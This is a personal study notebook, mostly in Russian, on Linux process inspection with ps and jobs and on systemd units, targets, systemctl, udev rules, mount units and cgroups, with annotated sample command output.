mint        1967  0.0  0.0  46948   684 ?        Ss   янв29   0:00 /usr/lib/bluetooth/obexd

ps -ef  //отразить также PID процесса-родителя PPID, C - cpu utilization
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 14:23 ?        00:00:00 /sbin/init text splash
root           2       0  0 14:23 ?        00:00:00 [kthreadd]
root           3       2  0 14:23 ?        00:00:00 [rcu_gp]
root           4       2  0 14:23 ?        00:00:00 [rcu_par_gp]
....

ps axf // слепок о всех процессах в виде дерева
    PID TTY      STAT   TIME COMMAND
      2 ?        S      0:00 [kthreadd]
      3 ?        I<     0:00  \_ [rcu_gp]
ps j // ps для заданий jobs
   PPID     PID    PGID     SID TTY        TPGID STAT   UID   TIME COMMAND
  31584   31610   31610   31610 pts/3      31664 Ss     999   0:00 bash
  31610   31632   31632   31610 pts/3      31664 T      999   0:00 man 7 signal
ps a  // расшир слепок обо всех процессах, в.т. на !! tty7  xorg - сервер X terminal/ GUI
    PID TTY      STAT   TIME COMMAND
   1150 tty7     Ssl+  10:53 /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/
  31610 pts/3    Ss     0:00 bash
  31632 pts/3    T      0:00 man 7 signal
ps -o ipd, -o -vsz, -o comm, -o user, -o tty  // инф о  процессах с выборочными параметрами 
ps afo pid,tty,ruid,rgid,comm,vsz // инф о  процессах с выборочными параметрами !!
    PID TT        RUID  RGID COMMAND            VSZ
  17176 pts/4      999   999 bash             11568
  17295 pts/4      999   999  \_ ps           13060
  17109 pts/3      999   999 bash             11668
  17209 pts/3      999   999  \_ htop         11388
  14634 pts/2      999   999 bash             11436
   6595 tty7         0     0 Xorg            344312
ps axfo pid,tty,ruid,rgid,comm,vsz  //  инф о ВСЕХ  процессах с выборочными параметрами !!
    PID TT        RUID  RGID COMMAND            VSZ
      2 ?            0     0 kthreadd             0
      3 ?            0     0  \_ rcu_gp           0
      4 ?            0     0  \_ rcu_par_gp       0

ps -o pid,euser,ruser // вывод EUID (effective - действующий) UID и  RUID (real - настоящий) UID см "Linux Ядро Kernel Процессы и их свойства systemd grab ps top htop strace.doc"
    PID EUSER    RUSER
   1916 oem      oem
   2338 oem      oem
ps axfo pid,euser,ruser // вывод EUID RUID
ps l //   man:  "Display BSD long format" 
F   UID     PID    PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND
4   999    9250    9224  20   0  12028  5544 do_wai Ss   pts/0      0:00 bash
0   999    9640    9250  20   0  10708  1276 -      T    pts/0      0:00 ping localhost
4   999    9648    9250  20   0  11160  3760 do_sig T    pts/0      0:00 man 7 signal
4   999    9656    9648  20   0   9172  2408 do_sig T    pts/0      0:00 pager
4   999    9665    9250  20   0   9172  2584 do_sig T    pts/0      0:00 less vmcp.txt
0   999    9743    9250  20   0  10708  1288 -      T    pts/0      0:00 ping localhost
4   999    9750    9224  20   0  11984  5524 do_wai Ss   pts/1      0:00 bash
4   999    9771    9750  20   0  11160  3648 do_wai S+   pts/1      0:00 man 7 signal
4   999    9779    9771  20   0   9304  2384 wait_w S+   pts/1      0:00 pager
0   999    9946    9250  20   0  13060  3176 -      R+   pts/0      0:00 ps l
$ ps jf // пояснение man "j-BSD job control format","f-ASCII art process hierarchy(forest)".
// PPID - parent process PID ! PGID-id группы процессов,  PGID=PID лидера процесса (запустивщей дерео программы). Т.е.pager (листалка man) выполнена/запущена в группу процесса PGID  man c PID=9648
   PPID     PID    PGID     SID TTY        TPGID STAT   UID   TIME COMMAND
   9224    9750    9750    9750 pts/1       9771 Ss     999   0:00 bash
   9750    9771    9771    9750 pts/1       9771 S+     999   0:00  \_ man 7 sig
   9771    9779    9771    9750 pts/1       9771 S+     999   0:00      \_ pager
   9224    9250    9250    9250 pts/0       9840 Ss     999   0:00 bash
   9250    9640    9640    9250 pts/0       9840 T      999   0:00  \_ ping loca
   9250    9648    9648    9250 pts/0       9840 T      999   0:00  \_ man 7 sig
   9648    9656    9648    9250 pts/0       9840 T      999   0:00  |   \_ pager
   9250    9665    9665    9250 pts/0       9840 T      999   0:00  \_ less vmcp
   9250    9743    9743    9250 pts/0       9840 T      999   0:00  \_ ping loca
   9250    9840    9840    9250 pts/0       9840 R+     999   0:00  \_ ps jf


man ps // ps help 
PROCESS STATE CODES Here are the different values that the s, stat and state output
specifiers (header "STAT" or "S") will display to describe the state of  a process:
   D  uninterruptible sleep (usually IO)
   I  Idle kernel thread
   R  running or runnable (on run queue)
   S  interruptible sleep (waiting for an event to complete)
   T  stopped by job control signal
   t  stopped by debugger during the tracing
   W  paging (not valid since the 2.6.xx kernel)
   X  dead (should never be seen)
   Z  defunct ("zombie") process, terminated but not reaped by its parent
       For BSD formats and when the stat keyword is used, additional
       characters may be displayed:

               <    high-priority (not nice to other users)
               N    low-priority (nice to other users)
               L    has pages locked into memory (for real-time and
                    custom IO)
               s    is a session leader
               l    is multi-threaded (using CLONE_THREAD, like NPTL
                    pthreads do)
               +    is in the foreground process group

$ ps f // статистика о процессах на 2х! псевдотерминалах pts /0 и /1 в виде "деревьев"
     // процесс man 9771 вызывает процесс pager ("листалка" текста)
    PID TTY      STAT   TIME COMMAND
   9750 pts/1    Ss     0:00 bash
   9771 pts/1    S+     0:00  \_ man 7 signal
   9779 pts/1    S+     0:00      \_ pager
   9250 pts/0    Ss     0:00 bash
   9640 pts/0    T      0:00  \_ ping localhost
   9648 pts/0    T      0:00  \_ man 7 signal
   9656 pts/0    T      0:00  |   \_ pager
   9665 pts/0    T      0:00  \_ less vmcp.txt
   9743 pts/0    T      0:00  \_ ping localhost
   9787 pts/0    R+     0:00  \_ ps f
$ jobs -l //  jobs с отображением PID процессов.  "+" тольк, что был оствновлен, "-" недавно остановлен.
[1]   9640 Stopped                 ping localhost
[2]-  9648 Stopped                 man 7 signal
[3]+  9665 Stopped                 less vmcp.txt


ps -aux // слепок всех процесс, в т.ч. системных !
PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.6 101832 13200 ?        Ss   Feb13   0:04 /sbin/init splash
root           2  0.0  0.0      0     0 ?        S    Feb13   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   Feb13   0:00 [rcu_gp]
mint        6944  0.1  3.0 753608 61640 ?        Sl   Feb13   0:36 Thunar --daemon
mint        7048  0.0  0.6 447428 13748 ?        Ssl  Feb13   0:00 xfce4-volumed
root        7154  0.0  0.0      0     0 ?    q    I<   Feb13   0:00 [uas]
mint        7372  0.0  0.3 241044  7728 ?      Sl   Feb13 0:00 /usr/bin/gnome-keyring-daemon --st
mint       12193  0.3  2.5 554932 52376 ?        Rl   Feb13   0:29 xfce4-terminal
mint       12219  0.0  0.2  11648  5304 pts/0    Ss   Feb13   0:00 bash
mint       12283  0.0  0.2  12036  5732 pts/1    Ss+  Feb13   0:00 bash
root       12416  0.0  0.0      0     0 ?        I    Feb13   0:04 [kworker/0:0-events]
mint       12630  0.0  0.2  11492  4220 pts/1    T    Feb13   0:00 vi /home/mint/vmcp.txt
mint       12631  0.0  0.2  11492  4296 pts/1    T    Feb13   0:00 vi /home/mint/vmcp.txt
mint       13104  0.0  0.0   8272   504 ?        Ss   01:37   0:00 iperf3 -s -p 9999 -D

cpio // copy files to and from archives


 = = =  = = =  = = =  ПРОЦЕССЫ systemd init  = = =  = = =  = = = 

 !! systemd = 1) программа "система инициализации (первый процесс)" и 2) сервисный менеджер
канал GNU Linux Pro - толковое описание systemd - сервисный менеджер и первый процесс
https://www.youtube.com/watch?v=bg6H-HRIad4  Системный менеджер systemd
https://www.youtube.com/watch?v=7dX6JF6pLmw  Система инициализации systemd

ls -l /sbin/init // ПУТЬ К ТЕКУЩЕЙ СИСТЕМЕ ИНИЦИАЛИЗАЦИИ  (systemd)
lrwxrwxrwx 1 root root 20 мар 20  2023 /sbin/init -> /lib/systemd/systemd

См "man systemd": 1) "При запуске как первый процесс (в пространстве пользователя) при загрузке 
 (как первый процесс с PID 1), она действует как Система Инициализации, которая запускает и поддерживает  
  службы! пользовательского пространства"
2) Systemd также работает как "Сервисный менеджер" (CM systemd).
 Systemd - запускает службы/демоны(фоновые программы)пользовательского пространства, а также 
  управляет log,сетью и т.д.  
 Как Сервисный менеджер systemd работает с текстовыми ФАЙЛАМИ!!КОНФИГУРАЦИИ - units (юнитами), 
   как с основной единицей управления. Между юнитами могут быть ЗАВИСИСМОСТИ.
 ЗАВИСИСМОСТИ (Before/After/Wants..) - один сервис может быть запущен только после другого, 
   или наоборот - запущен только,  если другой модуль НЕ запущен.
 Для работы со службами СМ systemd использует  юнит "*.service" - тестовый файл, который описывает службу/демона, 
 являющийся инструкцией по эксплуатации  службы/демона, определяющий как запускать/останавливать службу,
 в какой очередности по отношению к другим демонам (реализация ЗАВИСИСМОСТЕЙ).
 СМ systemd как бы "оборачивает" демонов в "service". 

!!! unit юнит модуль systemd:
man systemd.unit: Unit configuration -service.service, socket.socket, device.device, mount.mount,
   automount.automount, swap.swap, target.target, path.path, timer.timer, slice.slice, scope.scope
таймеры: «timer» unit файл описывает события, возникающие с установленной частотой или в опред времЯ.
Если сервис ссылается на таймер,процесс будет запущен в установленное время (копирует возможностИ cron).
«network»-unit файл описывает сетевой интерфейс и позволяет его настраивать, а также отражать зависимость
сервиса от какого-либо интерфейса.

!!!** !!!*https://ru.wikipedia.org/wiki/Systemd !!!***!!!
CM systemd оперирует специально оформленными !КОНФИГУРАЦИОННЫМИ ФАЙЛАМИ! — "модулями (англ. unit).
Каждый модуль отвечает за отдельно взятую службу/демон, точку монтирования,
  подключаемое устройство, файл подкачки, виртуальную машину и т.п. ресурсы.
 Существуют специальные типы модулей, которые не несут функциональной нагрузки, но
 позволяют задействовать дополнительные возможности systemd, к ним относятся модули типа
  target, slice, automount и ряд других. 
CM systemd поддерживает следующие типы модулей 11 типов :
.target — юнит группировки юнитов/модулей, воплощая концепцию runlevel/уровней запуска;
.service — отвечает за запуск демонов (служб), также поддерживает вызов  интерпретаторов
   для исполнения пользовательских скриптов;
.mount — отвечает за монтирование файловых систем;
.automount — позволяет отложить монтирование файловых систем до фактического обращения 
   к точке монтирования;
.swap — отвечает за подключение файла или устройства подкачки;
.timer — позволяет запускать модули по расписанию;
.socket — предоставляет службам поддержку механизма сокет-активации;
.slice — отвечает за создание контейнера cgroups;
device - файл устройства, генерируется на этапе загрузки силами udev (вт.ч из fstab)
.path — позволяет запускать модули при появлении пути в файловой системе.
Systemd даёт преимущества в следующем:
1)!сокет-активные и !шина-активные службы, которые иногда приводят к лучшему распараллеливанию взаимозависимых служб;
использование cgroups для отслеживания служебных процессов, вместо идентификаторов процессов (PID), это означает,
 что демоны не будут потеряны даже после разветвления в другие процессы.
В апреле 2012 года исходные коды менеджера устройств udev были объединены с systemd[9].
2) Помимо простого запуска и контроля служб, systemd предлагает некоторые удобные функции,
 для использования которых ранее системным администраторам приходилось прибегать к помощи
  дополнительных программ-демонов. Среди таких функций:
  сокет-активация служб (заменяет inetd);
  запуск сервисов по расписанию (заменяет cron);  !!!
  работа с аппаратным сторожевым таймером (заменяет watchdog);
  смена корня (заменяет chroot);
  автомонтирование томов и сетевых ресурсов (заменяет файлы mount и fstab);
  journalctl — служба журналирования а также см  ниже  *** *** Утилиты systemd ***  ***


 *** target ***
(man systemd.target: Файл конфигурации модуля, имя которого заканчивается на «.target», кодирует информацию о целевом модуле systemd, который используется для группировки модулей и в качестве известных точек синхронизации во время запуска) - например один target определяет параметры интерфейса (CLI/GUI), звука и работы сети для определенных условия, например runlevel 5 или graphical.target.
https://debian-handbook.info/browse/ru-RU/stable/unix-services.html#sect.systemd
Файл «цели» в systemd описывает состояние системы, когда функционирует некоторый набор сервисов.
  Его можно рассматривать как эквивалент уровня запуска. Одна из целей — local-fs.target;
  при её достижении остальная система может рассчитывать, что все локальные файловые системы
  смонтированы и доступны. В число других  целей входят network-online.target и.
  Зависимости цели могут быть указаны как внутри файла target (в строке Requires=), так и с 
  использованием символьной ссылки на файл service в каталоге /lib/systemd/system/targetname.target.wants/.
  Например /etc/systemd/system/printer.target.wants/ cодержит ссылку на /lib/systemd/system/cups.service,
  поэтому systemd запустит CUPS для достижения цели printer.target.

systemctl list-dependencies graphical.target // список зависимостей для graphical.target 
graphical.target
● ├─accounts-daemon.service
● ├─lightdm.service
○ ├─ubiquity.service
● ├─udisks2.service
● └─multi-user.target  //видно, что graphical.target основан на запуске multi-user.target(runlevel без GUI) идр юнитов
○   ├─anacron.service
●   ├─avahi-daemon.service
●   ├─console-setup.service
●   ├─cron.service
●   ├─dbus.service
○   ├─dmesg.service
○   ├─dns-clean.service
○   ├─e2scrub_reap.service
○   ├─grub-common.service
●   ├─networkd-dispatcher.service

*** Переход между target/runlevel ***
sudo systemctl set-default multi-user.target // установить по умолчанию multi-user.target(runlevel без GUI)
    // система загрузиться  multi-user.target при СЛЕДУЮЩЕМ запуск
Created symlink /etc/systemd/system/default.target → /lib/systemd/system/multi-user.target.
sudo systemctl set-default graphical.target
Removed /etc/systemd/system/default.target.
Created symlink /etc/systemd/system/default.target → /lib/systemd/system/graphical.target.
!!sudo  systemctl isolate *.target // !мгновенно/СЕЙЧАС ЖЕ! перевести систему в режим *.target

sudo systemctl isolate rescue.target //СЕЙЧАС ЖЕ! перевести систему в режим восстановления
  // используется когда система не загружается 
ls -ilL  /etc/systemd/system/default.target // просмотр runlevel по умолчанию (после перезагрузки)

***Просмотр юнита target ***
cat /lib/systemd/system/graphical.target // 
[Unit]
Description=Graphical Interface
Documentation=man:systemd.special(7)
Requires=multi-user.target //graphical.target(GT) требует предварит загрузки multi-user.target 
    // без multi-user.target GT не будет рабоать
Wants=display-manager.service  // Если этот display-manager.service, есть, перед GT
    //  желательно его  загрузить,  но и без него GT будет работать
Conflicts=rescue.service rescue.target //GT не будет работать с этим сервисом и таргетом
    // запуск GT остановит работу rescue.service rescue.target
After=multi-user.target rescue.service rescue.target display-manager.service
   //GT загрузиться после них
AllowIsolate=yes // для GT можно сделать  "systemctl isolate graphical.target"

!!!! Место хранения КОНФИГУРАЦИОННЫХ ФАЙЛОВ systemd (все юниты содержаться в): !!! 
A) /usr/lib/systemd/system/  - юниты, записанные в процессе установки Linux или внеш.программ(нпр. apache2)
B)  /etc/systemd/system - юниты, записанные от лица/действия администратора,  
   // для сервисов/service  - ВКЛЮЧЕННЫЕ и ЗАГРУЖАЕМЫЕ по умолчанию!!
C) остальные пути поиска юнитов (для разных дистриб Linux) System Unit Search Path:/etc/systemd/system.control/* /run/systemd/system.control/*        /run/systemd/transient/* /run/systemd/generator.early/* /etc/systemd/system/* /etc/systemd/system.attached/* /run/systemd/system/*
/run/systemd/system.attached/* /run/systemd/generator/* ... /lib/systemd/system/* /run/systemd/generator.late/*)
D) найти расположение юнита: 
systemctl status Name_Unit
● Name_Unit - описание юнита
     Loaded: loaded (/lib/systemd/system/Name_Unit; <-! 

ПРАВИЛА ОФОРМЛЕНИЯ юнитов см "man systemd.unit", в т.ч свойства(условия)
 Before=, After=,"зависимости"  After=, Wants= и др. 


cat /lib/systemd/system/ssh.socket
[Unit]
Description=OpenBSD Secure Shell server socket
Before=ssh.service
Conflicts=ssh.service
ConditionPathExists=!/etc/ssh/sshd_not_to_be_run
[Socket]
ListenStream=22  // действие по активации сокета на 22 порту!!!
Accept=yes
[Install]
WantedBy=sockets.target

# !! добавить юнит unit systemd  в !автозагрузку! - ключ "enable", 
   "disable" - искл из автозагрузки
systemctl enable apache2.service # демон службы apache2 добавлен в автозапуске

$sudo systemctl status apache2.service
● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service;
    // узнать, где находится "инит" service для apache2
$ cat /lib/systemd/system/apache2.service
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target
Documentation=https://httpd.apache.org/docs/2.4/
[Service]
Type=forking
Environment=APACHE_STARTED_BY_SYSTEMD=true
ExecStart=/usr/sbin/apachectl start
ExecStop=/usr/sbin/apachectl graceful-stop
ExecReload=/usr/sbin/apachectl graceful
KillMode=mixed
PrivateTmp=true
Restart=on-abort
[Install]
WantedBy=multi-user.target


who -r // показать уровень выполнения systemd/init OC - runlevel  в стиле SysV 
   "уровень выполнения 5"
runlevel // показать уровень выполнения в стиле SysV 
   "N 5"
systemctl get-default
   "graphical.target"

systemctl get-default // показать уровень запуска=target в стиле systemd graphical.target
       Table 1. Mapping between runlevels SysV and systemd targets
       ┌─────────┬───────────────────┐
       │Runlevel │ Target            │
       ├─────────┼───────────────────┤
       │0        │ poweroff.target   │
       ├─────────┼───────────────────┤
       │1        │ rescue.target     │
       ├─────────┼───────────────────┤
       │2, 3, 4  │ multi-user.target │
       ├─────────┼───────────────────┤
       │5        │ graphical.target  │
       ├─────────┼───────────────────┤
       │6        │ reboot.target     │
       └─────────┴───────────────────┘
DESCRIPTION       runlevel prints the previous and current SysV runlevel if they are known. 
  The two runlevel characters are separated by a single space character.
If a runlevel cannot be determined, N is printed instead. If neither can be determined, the word "unknown" is printed.

                 *** *** Утилиты systemd ***  ***
systemctl, journalctl и след
systemd-cgtop - top просмотр загрузки ОЗУ и пр юнитами systemd
systemd-cgls просмотр древовидной структуры юниов systemd
systemd-analyze -h // !просмотр аналитической информации о systemd!
systemd-analyze balme - время загрузки служб 
systemd-path // просмотр путей/директорий с данными systemd
остальные см - $systemd-<tab>
              ***** systemctl ******
man systemctl   //    утилита для работы systemd  !!
SYSTEMCTL(1)    NAME   systemctl - Control the systemd system and service manager
man service // !! Т.Е. - утилита для  System V,  В ОС MINT22 ДЛЯ ОБРАТНОЙ СОВМЕСТИМОСТИ 
SERVICE(8)    NAME       service - run a System V init script

ПРОГРАММА systemctl - //https://losst.pro/upravlenie-sluzhbami-linux?cmdurl=1
Утилита  systemd "systemctl" отвечает за все действия с systemd - https://dzen.ru/a/Xw4bF00eoQw2CMsB
Необходимым элементом работы systemd являются Unit/модуль текстовый конфгр-ый  файл, которыми оперирует systemd, 
 Unit ТИПЫ:
service - обычная служба демон, программа
target - группа служб !!!!!!!!!!!
 Сами по себе target есть некая группировка юнитов, последовательность вызова юнитов (ЭКВИВЛЕНТ Runlevel SystemV). Это может  быть target последовательного вызова нескольких служб и ниже стоящий target.
automount - точка автоматического монтирования
device - файл устройства, генерируется на этапе загрузки силами udev (СМ НИжЕ)
mount - точка монтирования
path - файл или папка
scope - внешний процесс
slice - группа системных служб systemd
snapshot - сохраненное состояние запущенных служб
socket - позволяет активировать службу по необходимости.

systemctl list-units // выведет все запущенные Units, сокеты ,устройства ,точки монтирования.

systemctl list-unit-files // список всех ютниов .service .mount .target ....
systemctl list-units --type service --state running //список служб c состоянием state
systemctl status sshd.service // статус службы sshd.service 
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
     Active: active (running) since Sat 2023-03-18 22:42:51 +03; 33min ago
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 746 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 762 (sshd)
      Tasks: 1 (limit: 2224)
     Memory: 6.1M
        CPU: 70ms
     CGroup: /system.slice/ssh.service
             └─762 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
мар 18 22:42:51 LnxPC systemd[1]: Starting OpenBSD Secure Shell server...
мар 18 22:42:51 LnxPC sshd[762]: Server listening on 0.0.0.0 port 22.
мар 18 22:42:51 LnxPC sshd[762]: Server listening on :: port 22.
мар 18 22:42:51 LnxPC systemd[1]: Started OpenBSD Secure Shell server.
мар 18 22:44:45 LnxPC sshd[1414]: Accepted password for oem from 192.168.100.13 port 54114 ssh2
мар 18 22:44:45 LnxPC sshd[1414]: pam_unix(sshd:session): session opened for user oem(uid=29999) by (uid=0)

systemctl status user.slice  инит  slice ++++ systemd-cgtop
● user.slice - User and Session Slice
     Loaded: loaded (/lib/systemd/system/user.slice; static)
     Active: active since Wed 2023-11-15 17:41:09 +03; 53min ago
       Docs: man:systemd.special(7)
      Tasks: 189
     Memory: 794.2M
        CPU: 2min 2.123s
     CGroup: /user.slice
             └─user-29999.slice
               ├─session-c1.scope
               │ ├─1279 lightdm --session-child 12 15
               │ ├─1294 xfce4-session
               │ ├─1335 /usr/bin/VBoxClient --

https://www.youtube.com/watch?v=bg6H-HRIad4 см 4м40сек
 *** udev (1ВАР) *** - часть systemd:
0) обнаруживает подключение УСТР-ВА по сигналам ядра (видны через sudo dmesg -wH, sudo journalctl -ekf),
 которые отслеживает демон udevd, и автоматически запускает команды mknod/MAKEDEV 
(создает файл устройства) и insmod/modprob - загружает драйвер *.ko в ядро 
(подробно см основной раздел ВЫШЕ)
1) дает названия устройствам, создает сссылки на файлы устройства в /dev/? 
  передает ядру параметры для устройства, и т.д.
2) генерирет файлы systemd - device-юниты (*.device)  на этапе их загрузки. 
 device-юниты позволяют сделать взаимодействие между устройствами и др юнитами/сервисами
3) генерирет файлы mount-юниты (*.mount) на основе fstab (?в т.ч?), при этом учитывет зависимости и отличает 
   локальные fs от сетевых (  boot-efi.mount, dos.mount ....media-sd_VM_DEB.mount)
systemctl  list-units | grep \.mount
Системные журналы: journalctl -euf systemd-udevd.service // логи systemd от сервиса udevd

    *** Как работает udev (2 ВАР) https://debian-handbook.info/browse/ru-RU/stable/sect.hotplug.html#sect.udev  ***
1)Когда ядро уведомляет udev о появлении нового устройства, последний собирает различную информацию оБ устройстве 
 иззаписей в /sys/!!, особенно тех, которые позволяют уникально идентифицировать его 
 (MAC-адрес сетевой карты, серийный номер некоторых USB-устройств и т. п.).
2)пОЛУЧИВ ЕЕ, udev сверяется со всеми правилами в /etc/udev/rules.d/ и /lib/udev/rules.d/.
3) В ходе этого он принимает решение, 3.1)какое имя присвоить устройству,3.2)какие символьные ссылки создать
 (чтобы дать альтернативные имена) и 3.3)какие команды запустить.
Проверяются все эти файлы, и все правила выполняются последовательно (если в файлах не используются директивы «GOTO»). Может быть несколько правил, соответствующих отдельному событию.
Рассмотрим случай подключения USB-брелока и присвоим ему фиксированное имя. Во-первых, необходимо найти элементы, которые идентифицируют его уникальным образом. Для этого надо подключить его и запустить 
#udevadm info -a -n /dev/sdХ  -  !!!
Чтобы создать новое правило в /etc/udev/rules.d/, можно использовать проверки переменных как устройства, так и его родительских устройств. В приведённом примере можно создать два правила вроде этих:
KERNEL=="sd?", SUBSYSTEM=="block", ATTRS{serial}=="001372982B41EA7110000056", SYMLINK+="usb_Kingston/disk"
KERNEL=="sd?[0-9]", SUBSYSTEM=="block", ATTRS{serial}=="001372982B41EA7110000056", SYMLINK+="usb_Kingston/part%n"
После того, как эти правила прописаны в файле с именем, например, /etc/udev/rules.d/010_local.rules, можно просто отсоединить и заново подключить USB-брелок. После этого можно будет убедиться, что /dev/usb_Kingston/disk представляет диск, ассоциированный с USB-брелоком, а /dev/"usb_Kingston/part1 — его первый раздел.

* * * udev logs (/var/log/dmesg) * * *
Подобно многим демонам, udevd сохраняет журналы событий в /var/log/dmesg 
Но записи по умолчанию не очень подробные, и их обычно недостаточно для понимания происходящего.
Команда udevadm control --log-priority=info увеличит объём выдаваемой отладочной информации и решит эту проблему. А команда udevadm control --log-priority=err возвратит в состояние "по умолчанию" объём выводимой отладочной информации.

Модули mount - НЕКОТОРЫЕ (см ниже) генеририет systemd на основе fstab !!!!
systemctl list-unit-files *.mount
UNIT FILE                     STATE     VENDOR PRESET
-.mount                       generated -
boot-efi.mount                generated -
dev-hugepages.mount           static    -
dev-mqueue.mount              static    -
dos.mount                     generated -
media-sd_VM_DEB.mount         generated -
proc-sys-fs-binfmt_misc.mount disabled  disabled
run-vmblock\x2dfuse.mount     enabled   enabled
sys-fs-fuse-connections.mount static    -
sys-kernel-config.mount       static    -
sys-kernel-debug.mount        static    -
sys-kernel-tracing.mount      static    -

systemctl list-units *.mount
  UNIT                                              LOAD   ACTIVE SUB     DESCRIPTION
  -.mount                                           loaded active mounted Root Mount
  boot-efi.mount                                    loaded active mounted /boot/efi
  dev-hugepages.mount                               loaded active mounted Huge Pages File System
  dev-mqueue.mount                                  loaded active mounted POSIX Message Queue File System
  dos.mount                                         loaded active mounted /dos
  media-sd_VM_DEB.mount                             loaded active mounted /media/sd_VM_DEB
  run-credentials-systemd\x2dsysusers.service.mount loaded active mounted /run/credentials/systemd-sysusers.service
 ...
  sys-kernel-tracing.mount                          loaded active mounted Kernel Trace File System

systemctl list-dependencies dos.mount //лист зависимостей mount
dos.mount
● ├─-.mount
● ├─dev-disk-by\x2duuid-DFDC\x2d0B9C.device
● ├─dev-sda2.device
● ├─system.slice
● └─systemd-fsck@dev-disk-by\x2duuid-DFDC\x2d0B9C.service
echo $(uname -r) - ИМЯ ФАЙЛА ТЕКУЩЕГО ЯДРА 


systemctl -l --type mount // посмотреть все созданные в systemd точки монтирования 
 UNIT                                              LOAD   ACTIVE SUB     DESCRIPTION               
  -.mount                                     loaded active mounted Root Mount
  boot-efi.mount                              loaded active mounted /boot/efi
  dev-hugepages.mount                         loaded active mounted Huge Pages File System
  dev-mqueue.mount                            loaded active mounted POSIX Message Queue File Syst>
  mnt-md22.mount                              loaded active mounted /mnt/md22
  run-cred-systemd\x2dsysusers.service.mount loaded active mounted /run/credentials/systemd-sysu>
  run-user-29999-gvfs.mount                   loaded active mounted /run/user/29999/gvfs
  run-user-29999.mount                        loaded active mounted /run/user/29999
  sys-fs-fuse-connections.mount               loaded active mounted FUSE Control File System
  sys-kernel-config.mount                     loaded active mounted Kernel Configuration File Sys>
  sys-kernel-debug.mount                      loaded active mounted Kernel Debug File System
  sys-kernel-tracing.mount                    loaded active mounted Kernel Trace File System


sudo systemctl status *.mount // просмотр !!!!всех точек монтирования, включая созданые автоматически в systemd из fstab. Источники данных  Loaded: loaded (ххххх):
 /lib/systemd/system/sys-kernel-debug.mount; static
 /etc/fstab; generated
 /proc/self/mountinfo

sudo systemctl status mnt-md22.mount // просмотр данных о точке монтир метадиска raid.созданной
   // автоматически в systemd из fstab"UUID=83b4...87be2 /mnt/md22 ext4 errors=remount-ro 0 0"
● mnt-md22.mount - /mnt/md22
     Loaded: loaded (/proc/self/mountinfo)
     Active: active (mounted) since Mon 2023-04-17 10:29:13 +03; 16min ago
      Where: /mnt/md22
       What: /dev/md22

sudo systemctl status boot-efi.mount // статус точки монтирования boot-efi.mount
                                    //sda3 раздел efi присоединен в каталог /boot/ !!
● boot-efi.mount - /boot/efi
     Loaded: loaded (/etc/fstab; generated)
     Active: active (mounted) since Sun 2023-03-26 23:11:12 +03; 8min ago
      Where: /boot/efi
       What: /dev/sda3
       Docs: man:fstab(5)
             man:systemd-fstab-generator(8)
      Tasks: 0 (limit: 2224)
     Memory: 20.0K
        CPU: 1ms
     CGroup: /system.slice/boot-efi.mount

мар 26 23:11:12 LnxPC systemd[1]: Mounting /boot/efi...
мар 26 23:11:12 LnxPC systemd[1]: Mounted /boot/efi.

systemctl --type=target // список целей
  UNIT                   LOAD   ACTIVE SUB    DESCRIPTION
  basic.target           loaded active active Basic System
  cryptsetup.target      loaded active active Local Encrypted Volumes
  getty.target           loaded active active Login Prompts
  graphical.target       loaded active active Graphical Interface
  local-fs.target        loaded active active Local File Systems
  multi-user.target      loaded active active Multi-User System
   ...
  network.target         loaded active active Network
  nss-lookup.target      loaded active active Host and Network Name Lookups
  nss-user-lookup.target loaded active active User and Group Name Lookups
  paths.target           loaded active active Path Units
  sound.target           loaded active active Sound Card
  swap.target            loaded active active Swaps
  sysinit.target         loaded active active System Initialization
  timers.target          loaded active active Timer Units
  veritysetup.target     loaded active active Local Verity Protected Volumes
  zfs-import.target      loaded active active ZFS pool import target



sudo systemctl list-dependencies graphical.target  // список зависимостей цели загрузки 
graphical.target
● ├─accounts-daemon.service
● ├─lightdm.service
○ ├─systemd-update-utmp-runlevel.service
○ ├─ubiquity.service
● ├─udisks2.service
● └─multi-user.target
○   ├─anacron.service
●   ├─avahi-daemon.service

systemctl list-unit-files --type service // список юниов service 
systemctl list-unit-files 'name_serv*' // поиск службы linux по имени
sudo systemctl start имя_службы.service //Запустить службу linux 
sudo systemctl stop имя_службы.service //Остановить службу linux 

systemctl show -p Requires sshd.service // показать заваисимости Requires
  Requires=system.slice -.mount sysinit.target
systemctl show -p Wants graphical.target // показать заваисимости Wants
  Wants=accounts-daemon.service systemd-update-utmp-runlevel.service udisks2.service ubiquity.service lightdm.service
systemctl show -p After graphical.target // показать заваисимости After
  After=rescue.target rescue.service ubiquity.service lightdm.service accounts-daemon.service udisks2.service multi-user.target

systemctl status boot-efi.mount // статус точки монтирования раздла GPT EFI sda3
● boot-efi.mount - /boot/efi
     Loaded: loaded (/etc/fstab; generated)
     Active: active (mounted) since Sat 2023-04-08 22:22:06 +03; 20min ago
      Where: /boot/efi
       What: /dev/sda3
       Docs: man:fstab(5)
             man:systemd-fstab-generator(8)
      Tasks: 0 (limit: 2204)
     Memory: 12.0K
        CPU: 1ms
     CGroup: /system.slice/boot-efi.mount
апр 08 22:22:06 LnxPC systemd[1]: Mounting /boot/efi...
апр 08 22:22:06 LnxPC systemd[1]: Mounted /boot/efi.

  * * * cgroup - група управления * * *
https://www.youtube.com/watch?v=bg6H-HRIad4 см 4м40сек
CGroup - технология изоляции на уровне ядра группы процессов с выделением ей опредеелнных CPU,ОЗУ и др
  т.е. это схема виртуализации на уровне операц системы Linux 

systemd-cgls // просмотр группы управления для отслеживания иерархии процеcсов !
   берется из /sys/fs/cgroup/
Control group /:
-.slice
├─user.slice
│ └─user-29999.slice
│   ├─session-2.scope
│   │ ├─1435 sshd: oem [priv]
│   │ ├─1443 sshd: oem@pts/0
│   │ ├─1444 -bash
│   │ ├─2058 systemd-cgls
│   │ └─2059 pager
│   ├─session-c1.scope
